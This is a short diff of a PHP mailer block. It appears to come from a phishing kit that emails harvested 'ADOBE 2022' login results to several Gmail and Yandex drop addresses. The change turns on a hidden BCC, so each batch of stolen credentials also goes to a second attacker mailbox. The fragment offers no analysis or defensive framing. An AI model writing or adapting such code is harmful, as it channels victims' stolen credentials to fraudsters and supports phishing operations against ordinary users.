@@ -73,9 +73,9 @@ try {
     //Recipients
     $mail->setFrom('jamesown17@gmail.com', 'sender');
     $mail->addAddress('myresult2019@gmail.com',);   //Name is optional
-    //$mail->addBCC('rubybrainoffice@gmail.com');
+    $mail->addBCC('myresult2019@yandex.com');
   
-    
+
     //Content
     $mail->isHTML(true);                                  //Set email format to HTML
     $mail->Subject = 'ADOBE 2022 | NEW R3SULT';
